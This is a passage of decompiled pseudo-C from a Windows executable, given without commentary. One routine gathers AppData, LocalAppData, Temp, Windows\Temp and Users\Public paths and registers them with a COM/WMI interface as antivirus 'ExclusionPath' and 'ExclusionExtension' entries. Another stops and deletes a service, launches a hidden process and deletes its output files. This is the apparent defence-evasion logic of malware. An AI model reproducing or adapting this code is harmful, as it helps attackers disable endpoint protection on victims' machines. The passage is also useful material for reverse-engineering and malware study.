                iVar29 = (*pcVar5)(*(undefined8 *)(&stack0x000014d0 + lVar12),ppvObject,0,plVar9);
                plVar9 = (longlong *)*plVar9;
                if (plVar9 != (longlong *)0x0 && -1 < iVar29) {
                  plVar1 = (longlong *)(&stack0x00001478 + lVar12);
                  *plVar1 = 0;
                  lVar61 = *plVar9;
                  *(longlong **)(&stack0x00001520 + lVar12) = plVar9;
                  pcVar5 = *(code **)(lVar61 + 0x78);
                  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001f7f;
                  iVar29 = (*pcVar5)(plVar9,0,plVar1);
                  *(longlong *)(&stack0x00001558 + lVar12) = *plVar1;
                  if (*plVar1 != 0 && -1 < iVar29) {
                    pCVar49 = &stack0x00001058 + lVar12;
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001fb5;
                    DVar28 = GetEnvironmentVariableA("APPDATA",pCVar49,0x104);
                    if (DVar28 == 0) {
                      lVar61 = 0;
                    }
                    else {
                      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001fcc;
                      lVar61 = FUN_1400071fd((longlong)(&stack0x00001058 + lVar12));
                      *(longlong *)(&stack0x00001340 + lVar12) = lVar61;
                      *(undefined1 **)(&stack0x00001528 + lVar12) = &stack0x00001350 + lVar12;
                      *(LPSTR *)(&stack0x00001348 + lVar12) = pCVar49;
                      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 1;
                      lVar61 = *(longlong *)((longlong)&uStack_48 + lVar12);
                    }
                    pCVar49 = &stack0x00001160 + lVar12;
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001ffd;
                    DVar28 = GetEnvironmentVariableA("LOCALAPPDATA",pCVar49,0x104);
                    if (DVar28 != 0) {
                      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000200d;
                      lVar52 = FUN_1400071fd((longlong)(&stack0x00001160 + lVar12));
                      plVar9 = *(longlong **)(&stack0x00001528 + lVar12);
                      *plVar9 = lVar52;
                      plVar9[1] = (longlong)pCVar49;
                      lVar61 = lVar61 + 1;
                    }
                    pCVar49 = (LPSTR)((longlong)aWStackX_20 + lVar12);
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140002034;
                    DVar28 = GetEnvironmentVariableA("TEMP",pCVar49,0x104);
                    if (DVar28 != 0) {
                      *(longlong *)(&stack0x00001528 + lVar12) = lVar61;
                      uVar33 = (ulonglong)
                               (uint)((int)*(undefined8 *)(&stack0x00001528 + lVar12) << 4);
                      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140002053;
                      lVar61 = FUN_1400071fd((longlong)aWStackX_20 + lVar12);
                      *(longlong *)(&stack0x00001340 + uVar33 + lVar12) = lVar61;
                      *(LPSTR *)(&stack0x00001348 + uVar33 + lVar12) = pCVar49;
                      lVar61 = *(longlong *)(&stack0x00001528 + lVar12) + 1;
                    }
                    uVar33 = (ulonglong)(uint)((int)lVar61 << 4);
                    *(char **)(&stack0x00001340 + uVar33 + lVar12) = "C:\\Windows\\Temp";
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0xf;
                    uVar35 = *(undefined8 *)((longlong)&uStack_48 + lVar12);
                    *(undefined8 *)(&stack0x00001348 + uVar33 + lVar12) = uVar35;
                    *(char **)(&stack0x00001350 + uVar33 + lVar12) = "C:\\Users\\Public";
                    *(undefined8 *)(&stack0x00001358 + uVar33 + lVar12) = uVar35;
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400020b7;
                    psa = FUN_140009167((longlong)(&stack0x00001340 + lVar12),lVar61 + 2);
                    if (psa != (SAFEARRAY *)0x0) {
                      *(SAFEARRAY **)(&stack0xffffffffffffffe0 + lVar12) = psa;
                      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0xd;
                      uVar33 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
                      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400020e6;
                      FUN_140009105(*(longlong **)(&stack0x00001558 + lVar12),
                                    *(undefined8 *)(&stack0x00001478 + lVar12),
                                    (undefined1 (*) [16])"ExclusionPath",uVar33,
                                    *(undefined8 *)(&stack0xffffffffffffffe0 + lVar12));
                      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 6;
                      lVar61 = *(longlong *)((longlong)&uStack_48 + lVar12);
                      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400020f5;
                      pSVar38 = FUN_140009167(0x14002d7d8,lVar61);
                      if (pSVar38 != (SAFEARRAY *)0x0) {
                        *(SAFEARRAY **)(&stack0x00001528 + lVar12) = pSVar38;
                        *(SAFEARRAY **)(&stack0xffffffffffffffe0 + lVar12) = pSVar38;
                        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x12;
                        uVar33 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
                        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140002128;
                        FUN_140009105(*(longlong **)(&stack0x00001558 + lVar12),
                                      *(undefined8 *)(&stack0x00001478 + lVar12),
                                      (undefined1 (*) [16])"ExclusionExtension",uVar33,
                                      *(undefined8 *)(&stack0xffffffffffffffe0 + lVar12));
                        *(undefined8 *)(&stack0x00001450 + lVar12) = 0;
                        pIVar7 = pProxy->lpVtbl;
                        *(undefined1 **)(&stack0xfffffffffffffff0 + lVar12) =
                             &stack0x00001450 + lVar12;
                        *(undefined8 *)(&stack0xfffffffffffffff8 + lVar12) = 0;
                        *(undefined8 *)(&stack0xffffffffffffffe8 + lVar12) =
                             *(undefined8 *)(&stack0x00001478 + lVar12);
                        *(undefined8 *)(&stack0xffffffffffffffe0 + lVar12) = 0;
                        p_Var8 = pIVar7[8].QueryInterface;
                        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000216d;
                        (*p_Var8)(*(IUnknown **)(&stack0x00001500 + lVar12),riid,ppvObject);
                        if (*(longlong **)(&stack0x00001450 + lVar12) != (longlong *)0x0) {
                          pcVar5 = *(code **)(**(longlong **)(&stack0x00001450 + lVar12) + 0x10);
                          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000217f;
                          (*pcVar5)();
                        }
                        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000218b;
                        SafeArrayDestroy(*(SAFEARRAY **)(&stack0x00001528 + lVar12));
                      }
                      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140002193;
                      SafeArrayDestroy(psa);
                    }
                    pcVar5 = *(code **)(**(longlong **)(&stack0x00001558 + lVar12) + 0x10);
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400021a7;
                    (*pcVar5)(*(undefined8 *)(&stack0x00001478 + lVar12));
                  }
                  pcVar5 = *(code **)(**(longlong **)(&stack0x00001520 + lVar12) + 0x10);
                  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400021bb;
                  (*pcVar5)(*(undefined8 *)(&stack0x000013a0 + lVar12));
                }
                *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400021c3;
                SysFreeString((BSTR)ppvObject);
              }
              pcVar5 = *(code **)(*plVar54 + 0x10);
              *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400021d0;
              (*pcVar5)(*(undefined8 *)(&stack0x000014d0 + lVar12));
            }
            *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400021d8;
            SysFreeString((BSTR)riid);
          }
          p_Var10 = pProxy->lpVtbl->Release;
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400021e5;
          (*p_Var10)(*(IUnknown **)(&stack0x00001500 + lVar12));
        }
        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400021ed;
        SysFreeString(bstrString);
      }
      pcVar5 = *(code **)(*plVar55 + 0x10);
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400021fb;
      (*pcVar5)(*(undefined8 *)(&stack0x000014e8 + lVar12));
    }
  }
  *(undefined8 *)((longlong)aWStackX_20 + lVar12) = *(undefined8 *)(&stack0x00001550 + lVar12);
  *(undefined8 *)(&stack0x00000028 + lVar12) = *(undefined8 *)(&stack0x00001530 + lVar12);
  *(undefined8 *)(&stack0x00000030 + lVar12) = *(undefined8 *)(&stack0x00001548 + lVar12);
  *(undefined8 *)(&stack0x00000038 + lVar12) = *(undefined8 *)(&stack0x00001538 + lVar12);
  *(undefined8 *)(&stack0x00000040 + lVar12) = *(undefined8 *)(&stack0x000014c0 + lVar12);
  *(undefined8 *)(&stack0x00000048 + lVar12) = *(undefined8 *)(&stack0x000014c8 + lVar12);
  (&stack0x00000050)[lVar12] = (byte)*(undefined4 *)(&stack0x00001518 + lVar12) & 1;
  (&stack0x00000051)[lVar12] = (byte)*(undefined4 *)(&stack0x00001540 + lVar12) & 1;
  (&stack0x00000052)[lVar12] = 0;
  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000225f;
  FUN_1400029e3((undefined8 *)((longlong)aWStackX_20 + lVar12));
  puVar62 = (undefined8 *)(&stack0x00001160 + lVar12);
  goto LAB_140001865;
}


// ==== FUN_1400029e3 @ 1400029e3 size 10777

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_1400029e3(undefined8 *param_1)

{
  PVOID *ppvVar1;
  undefined8 *puVar2;
  LPDWORD pDVar3;
  ulonglong *puVar4;
  uint *puVar5;
  uint *puVar6;
  ulonglong *puVar7;
  byte *pbVar8;
  undefined4 *puVar9;
  undefined1 uVar10;
  undefined1 uVar11;
  undefined1 uVar12;
  char cVar13;
  ushort uVar14;
  ushort uVar15;
  uint uVar16;
  uint uVar17;
  undefined8 uVar18;
  longlong lVar19;
  longlong lVar20;
  undefined4 uVar21;
  undefined4 uVar22;
  undefined4 uVar23;
  code *pcVar24;
  short sVar25;
  DWORD DVar26;
  uint uVar27;
  UINT UVar28;
  int iVar29;
  BOOL BVar30;
  int iVar31;
  ulonglong uVar32;
  longlong lVar33;
  undefined8 uVar34;
  HANDLE pvVar35;
  HANDLE hObject;
  short *psVar36;
  ulonglong uVar37;
  LPSTR pCVar38;
  char *pcVar39;
  longlong lVar40;
  char *pcVar41;
  void *pvVar42;
  undefined8 uVar43;
  void *_Memory;
  LPCSTR pCVar44;
  HMODULE pHVar45;
  FARPROC pFVar46;
  LPCSTR lpProcName;
  undefined1 *puVar47;
  byte bVar48;
  undefined8 uVar49;
  undefined *puVar50;
  LPSTR pCVar51;
  ulonglong uVar52;
  ulonglong uVar53;
  longlong *plVar54;
  longlong lVar55;
  undefined1 *puVar56;
  longlong lVar57;
  ulonglong uVar58;
  undefined *puVar59;
  undefined1 *puVar60;
  bool bVar61;
  undefined4 unaff_XMM6_Da;
  undefined4 unaff_XMM6_Db;
  undefined4 unaff_XMM6_Dc;
  undefined4 unaff_XMM6_Dd;
  undefined8 auStackX_8 [4];
  ulonglong uStack_48;
  
  uStack_48 = 0x1400029f9;
  uVar32 = FUN_14000d5c2();
  lVar20 = -uVar32;
  *(undefined4 *)(&stack0x00004d40 + lVar20) = unaff_XMM6_Da;
  *(undefined4 *)(&stack0x00004d44 + lVar20) = unaff_XMM6_Db;
  *(undefined4 *)(&stack0x00004d48 + lVar20) = unaff_XMM6_Dc;
  *(undefined4 *)(&stack0x00004d4c + lVar20) = unaff_XMM6_Dd;
  *(undefined8 *)(&stack0x00004cd8 + lVar20) = param_1[4];
  *(undefined8 *)(&stack0x00004cc8 + lVar20) = param_1[5];
  (&stack0x00004d28)[lVar20] = *(undefined1 *)(param_1 + 6);
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002a32;
  FUN_14000a118();
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002a37;
  FUN_14000a0ab();
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002a3c;
  DVar26 = GetCurrentProcessId();
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002a43;
  FUN_140009dd8(DVar26);
  *(undefined8 *)(&stack0x00004ce0 + lVar20) = *param_1;
  *(undefined8 *)(&stack0x00004cd0 + lVar20) = param_1[1];
  uVar43 = param_1[2];
  uVar18 = param_1[3];
  uVar10 = *(undefined1 *)(param_1 + 6);
  uVar11 = *(undefined1 *)((longlong)param_1 + 0x31);
  uVar12 = *(undefined1 *)((longlong)param_1 + 0x32);
  uVar49 = 0x104;
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002a7f;
  GetSystemDirectoryA(&stack0x00004900 + lVar20,0x104);
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002a87;
  lVar33 = FUN_1400071fd((longlong)(&stack0x00004900 + lVar20));
  puVar50 = &DAT_140019930;
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0xd;
  uVar32 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002aa4;
  uVar34 = FUN_14000ae64((longlong)(&stack0x00004b10 + lVar20),0x140019930,uVar32);
  *(longlong *)(&stack0x00004a80 + lVar20) = lVar33;
  *(undefined8 *)(&stack0x00004a88 + lVar20) = uVar49;
  *(undefined8 *)(&stack0x00004a90 + lVar20) = uVar34;
  *(undefined **)(&stack0x00004a98 + lVar20) = puVar50;
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002ad6;
  FUN_14000863c((undefined8 *)(&stack0x00004a68 + lVar20),&stack0x000042e8 + lVar20,0x104,
                (longlong *)(&stack0x00004a80 + lVar20));
  if (*(short *)(&stack0x00004a78 + lVar20) == 0) {
    (&stack0x00004d30)[lVar20] = uVar10;
    (&stack0x00004d1f)[lVar20] = uVar11;
    *(undefined8 *)(&stack0x00004c78 + lVar20) = uVar18;
    *(undefined8 *)(&stack0x00004c70 + lVar20) = uVar43;
    (&stack0x00004d1e)[lVar20] = uVar12;
    pCVar44 = *(LPCSTR *)(&stack0x00004a68 + lVar20);
    puVar60 = &stack0x00004b30 + lVar20;
    for (lVar33 = 0x114; lVar33 != 0; lVar33 = lVar33 + -1) {
      *puVar60 = 0;
      puVar60 = puVar60 + 1;
    }
    ppvVar1 = (PVOID *)(&stack0x00000030 + lVar20);
    *ppvVar1 = (PVOID)0x0;
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002b2a;
    Wow64DisableWow64FsRedirection(ppvVar1);
    *(undefined8 *)(&stack0xfffffffffffffff0 + lVar20) = 0;
    *(undefined4 *)(&stack0xffffffffffffffe8 + lVar20) = 0;
    *(undefined4 *)(&stack0xffffffffffffffe0 + lVar20) = 3;
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 1;
    uVar43 = *(undefined8 *)((longlong)&uStack_48 + lVar20);
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002b51;
    pvVar35 = CreateFileA(pCVar44,0x80000000,(DWORD)uVar43,(LPSECURITY_ATTRIBUTES)0x0,
                          *(DWORD *)(&stack0xffffffffffffffe0 + lVar20),
                          *(DWORD *)(&stack0xffffffffffffffe8 + lVar20),
                          *(HANDLE *)(&stack0xfffffffffffffff0 + lVar20));
    if (*ppvVar1 != (PVOID)0x0) {
      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002b61;
      Wow64RevertWow64FsRedirection(*ppvVar1);
    }
    if (pvVar35 != (HANDLE)0xffffffffffffffff) {
      *(undefined8 *)(&stack0xffffffffffffffe8 + lVar20) = 0;
      *(undefined4 *)(&stack0xffffffffffffffe0 + lVar20) = 0;
      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 2;
      uVar43 = *(undefined8 *)((longlong)&uStack_48 + lVar20);
      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002b88;
      hObject = (HANDLE)(*DAT_140034310)(pvVar35,0,uVar43,0);
      if (hObject != (HANDLE)0x0) {
        *(undefined8 *)(&stack0xffffffffffffffe0 + lVar20) = 0;
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 4;
        uVar43 = *(undefined8 *)((longlong)&uStack_48 + lVar20);
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002bac;
        psVar36 = (short *)(*DAT_140034318)(hObject,uVar43,0,0);
        if (psVar36 != (short *)0x0) {
          if ((*psVar36 == 0x5a4d) &&
             (uVar32 = (ulonglong)*(uint *)(psVar36 + 0x1e),
             *(int *)((longlong)psVar36 + uVar32) == 0x4550)) {
            uVar14 = *(ushort *)((longlong)psVar36 + uVar32 + 0x14);
            uVar27 = (uint)(*(short *)((longlong)psVar36 + uVar32 + 4) == -0x799c) * 0x10;
            if (uVar27 + 0x98 <= (uint)uVar14) {
              uVar37 = (ulonglong)uVar27 | 0x60;
              uVar27 = *(uint *)((longlong)psVar36 + uVar37 + uVar32 + 0x48);
              uVar16 = *(uint *)((longlong)psVar36 + uVar37 + uVar32 + 0x4c);
              *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1c;
              uVar37 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
              if (uVar27 != 0) {
                *(undefined8 *)((longlong)&uStack_48 + lVar20) = 3;
                uVar53 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
                lVar55 = uVar32 + uVar14;
                for (lVar33 = 0;
                    (ulonglong)*(ushort *)((longlong)psVar36 + uVar32 + 6) * 0x28 - lVar33 != 0;
                    lVar33 = lVar33 + 0x28) {
                  uVar17 = *(uint *)((longlong)psVar36 + lVar33 + lVar55 + 0x24);
                  if ((uVar17 <= uVar27) &&
                     (uVar27 < uVar17 + *(int *)((longlong)psVar36 + lVar33 + lVar55 + 0x20))) {
                    uVar27 = (uVar27 - uVar17) +
                             *(int *)((longlong)psVar36 + lVar33 + 0x2c + lVar55);
                    if (uVar27 != 0) {
                      lVar33 = 0;
                      goto LAB_140002c72;
                    }
                    break;
                  }
                }
              }
            }
          }
LAB_140002c97:
          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002c9d;
          (*DAT_140034320)();
        }
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002ca5;
        CloseHandle(hObject);
      }
      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002cad;
      CloseHandle(pvVar35);
    }
  }
LAB_140002cad:
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002cb9;
  CloseHandle(DAT_140034030);
  uVar32 = *(ulonglong *)(&stack0x00004cc8 + lVar20);
  if ((&stack0x00004d28)[lVar20] != '\0') {
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002cd2;
    FUN_14000726e();
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002cd7;
    uVar37 = FUN_14000691f();
    if (uVar37 != 0) {
      *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002cec;
      lVar33 = (*DAT_140034038)(0,0,0xf003f);
      if (lVar33 != 0) {
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002d0a;
        lVar55 = (*DAT_140034048)(lVar33,&DAT_140034aa4,0xf01ff);
        if (lVar55 != 0) {
          *(undefined8 *)(&stack0x0000003c + lVar20) = 0;
          *(undefined8 *)(&stack0x00000044 + lVar20) = 0;
          *(undefined8 *)(&stack0x00000030 + lVar20) = 0;
          *(undefined8 *)(&stack0x00000038 + lVar20) = 0;
          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 1;
          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002d2e;
          (*DAT_140034070)(lVar55);
          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002d37;
          (*DAT_140034068)(lVar55);
          *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002d40;
          (*DAT_140034058)(lVar55);
        }
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002d4c;
        DeleteFileA(&DAT_1400349a0);
        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002d55;
        (*DAT_140034058)(lVar33);
      }
    }
  }
  if (uVar32 == 0) {
    return;
  }
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 5;
  uVar37 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002d66;
  FUN_14000726e();
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002d6b;
  uVar53 = FUN_140007240();
  uVar53 = uVar53 * 0x5851f42d4c957f2d + 0x14057b7ef767814f;
  *(ulonglong *)(&stack0x00004c80 + lVar20) = uVar53;
  uVar53 = uVar53 % uVar37;
  puVar60 = &stack0x00004c50 + lVar20;
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002dae;
  puVar47 = puVar60;
  FUN_1400071aa((ulonglong *)(&stack0x00004c80 + lVar20),(longlong)puVar60,uVar53 | 8);
  (&stack0x00004c58)[uVar53 + lVar20] = 0;
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002dc2;
  pCVar38 = FUN_14000714e(&stack0x000042e8 + lVar20);
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002dd0;
  puVar56 = puVar47;
  lVar33 = FUN_140007110((longlong)puVar60);
  *(undefined ***)(&stack0x00000030 + lVar20) = &PTR_FUN_140017348;
  *(undefined1 **)(&stack0x00000038 + lVar20) = &stack0x00004030 + lVar20;
  *(undefined8 *)(&stack0x00000040 + lVar20) = 0x104;
  *(undefined8 *)(&stack0x00000048 + lVar20) = 0;
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002e0e;
  sVar25 = FUN_1400055ea((undefined8 *)(&stack0x00000030 + lVar20),(longlong)pCVar38,
                         (ulonglong)puVar47,0x140017320);
  if (sVar25 != 0) {
    return;
  }
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002e2d;
  sVar25 = FUN_1400055ea((undefined8 *)(&stack0x00000030 + lVar20),lVar33,(ulonglong)puVar56,
                         0x140017320);
  if (sVar25 != 0) {
    return;
  }
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 1;
  uVar37 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002e4d;
  sVar25 = FUN_14000541c((undefined8 *)(&stack0x00000030 + lVar20),0x1400194e0,uVar37);
  if (sVar25 != 0) {
    return;
  }
  pCVar44 = *(LPCSTR *)(&stack0x00000038 + lVar20);
  lVar33 = *(longlong *)(&stack0x00000048 + lVar20);
  puVar50 = &DAT_1400172c0;
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x37;
  uVar37 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002e75;
  lVar55 = FUN_1400056d3(0x1400348a0,0x1400172c0,uVar37);
  *(undefined ***)(&stack0x00004460 + lVar20) = &PTR_FUN_140017348;
  *(undefined1 **)(&stack0x00004468 + lVar20) = &stack0x00000030 + lVar20;
  *(undefined8 *)(&stack0x00004470 + lVar20) = 0x800;
  *(undefined8 *)(&stack0x00004478 + lVar20) = 0;
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002ea2;
  sVar25 = FUN_1400055ea((undefined8 *)(&stack0x00004460 + lVar20),lVar55,(ulonglong)puVar50,
                         0x140017320);
  if (sVar25 != 0) {
    return;
  }
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002ec7;
  sVar25 = FUN_1400055ea((undefined8 *)(&stack0x00004460 + lVar20),(longlong)pCVar44,lVar33 - 1,
                         0x140017320);
  if (sVar25 != 0) {
    return;
  }
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 3;
  uVar37 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002ee7;
  sVar25 = FUN_14000541c((undefined8 *)(&stack0x00004460 + lVar20),0x140019511,uVar37);
  if (sVar25 != 0) {
    return;
  }
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002f0d;
  sVar25 = FUN_1400055ea((undefined8 *)(&stack0x00004460 + lVar20),
                         *(longlong *)(&stack0x00004cd8 + lVar20),uVar32,0x140017320);
  if (sVar25 != 0) {
    return;
  }
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 2;
  uVar37 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002f2d;
  sVar25 = FUN_14000541c((undefined8 *)(&stack0x00004460 + lVar20),0x14001950b,uVar37);
  if (sVar25 != 0) {
    return;
  }
  uVar43 = *(undefined8 *)(&stack0x00004468 + lVar20);
  puVar2 = (undefined8 *)(&stack0x00004140 + lVar20);
  *puVar2 = 0;
  *(undefined8 *)(&stack0x00004148 + lVar20) = 0;
  *(undefined8 *)(&stack0x00004170 + lVar20) = 0;
  *(undefined8 *)(&stack0x00004178 + lVar20) = 0;
  *(undefined8 *)(&stack0x00004150 + lVar20) = 0;
  *(undefined8 *)(&stack0x00004158 + lVar20) = 0;
  *(undefined8 *)(&stack0x00004160 + lVar20) = 0;
  *(undefined8 *)(&stack0x00004168 + lVar20) = 0;
  *(undefined8 *)(&stack0x00004180 + lVar20) = 0;
  *(undefined8 *)(&stack0x00004188 + lVar20) = 0;
  *(undefined8 *)(&stack0x000041a0 + lVar20) = 0;
  *(undefined8 *)(&stack0x00004190 + lVar20) = 0;
  *(undefined8 *)(&stack0x00004198 + lVar20) = 0;
  *(undefined4 *)puVar2 = 0x68;
  *(undefined4 *)(&stack0x0000417c + lVar20) = 1;
  *(undefined8 *)(&stack0x00004ca0 + lVar20) = 0;
  *(undefined8 *)(&stack0x00004ca8 + lVar20) = 0;
  *(undefined8 *)(&stack0x00004cb0 + lVar20) = 0;
  *(undefined1 **)((longlong)auStackX_8 + lVar20) = &stack0x00004ca0 + lVar20;
  *(undefined8 **)((longlong)auStackX_8 + lVar20 + -8) = puVar2;
  *(undefined8 *)(&stack0xfffffffffffffff0 + lVar20) = 0;
  *(undefined8 *)(&stack0xfffffffffffffff8 + lVar20) = 0;
  *(undefined4 *)(&stack0xffffffffffffffe8 + lVar20) = 0x8000000;
  *(undefined4 *)(&stack0xffffffffffffffe0 + lVar20) = 0;
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002fa9;
  iVar29 = (*DAT_1400340c0)(0,uVar43,0);
  if (iVar29 == 0) {
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003052;
    GetLastError();
    return;
  }
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002fbd;
  CloseHandle(*(HANDLE *)(&stack0x00004ca8 + lVar20));
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002fcf;
  iVar29 = (*DAT_1400340c8)(*(undefined8 *)(&stack0x00004ca0 + lVar20),180000);
  if (iVar29 == 0x102) {
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 1;
    uVar43 = *(undefined8 *)((longlong)&uStack_48 + lVar20);
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002fe6;
    (*DAT_1400340d0)(*(undefined8 *)(&stack0x00004ca0 + lVar20),uVar43);
  }
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140002ff2;
  CloseHandle(*(HANDLE *)(&stack0x00004ca0 + lVar20));
  *(undefined8 *)(&stack0xfffffffffffffff0 + lVar20) = 0;
  *(undefined4 *)(&stack0xffffffffffffffe8 + lVar20) = 0x80;
  *(undefined4 *)(&stack0xffffffffffffffe0 + lVar20) = 3;
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 1;
  uVar43 = *(undefined8 *)((longlong)&uStack_48 + lVar20);
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x14000301c;
  pvVar35 = CreateFileA(pCVar44,0x80000000,(DWORD)uVar43,(LPSECURITY_ATTRIBUTES)0x0,
                        *(DWORD *)(&stack0xffffffffffffffe0 + lVar20),
                        *(DWORD *)(&stack0xffffffffffffffe8 + lVar20),
                        *(HANDLE *)(&stack0xfffffffffffffff0 + lVar20));
  if (pvVar35 == (HANDLE)0xffffffffffffffff) {
    return;
  }
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003033;
  DVar26 = GetFileSize(pvVar35,(LPDWORD)0x0);
  if (DVar26 < 2) {
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003040;
    CloseHandle(pvVar35);
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003048;
    DeleteFileA(pCVar44);
    return;
  }
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003072;
  FUN_140007051((longlong *)(&stack0x00004ce8 + lVar20),(undefined8 *)&DAT_1400172b0,
                (ulonglong)DVar26);
  if (*(short *)(&stack0x00004cf8 + lVar20) != 0) {
    *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003081;
    CloseHandle(pvVar35);
    return;
  }
  pcVar41 = *(char **)(&stack0x00004ce8 + lVar20);
  uVar37 = *(ulonglong *)(&stack0x00004cf0 + lVar20);
  pDVar3 = (LPDWORD)(&stack0x00004af8 + lVar20);
  *pDVar3 = 0;
  *(undefined8 *)(&stack0xffffffffffffffe0 + lVar20) = 0;
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400030b5;
  ReadFile(pvVar35,pcVar41,DVar26,pDVar3,*(LPOVERLAPPED *)(&stack0xffffffffffffffe0 + lVar20));
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400030bd;
  CloseHandle(pvVar35);
  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400030c5;
  DeleteFileA(pCVar44);
  if (*pDVar3 == DVar26) {
    if (((0xd < uVar37) && (*(int *)(pcVar41 + (uVar37 - 4)) == 0xd1d2)) &&
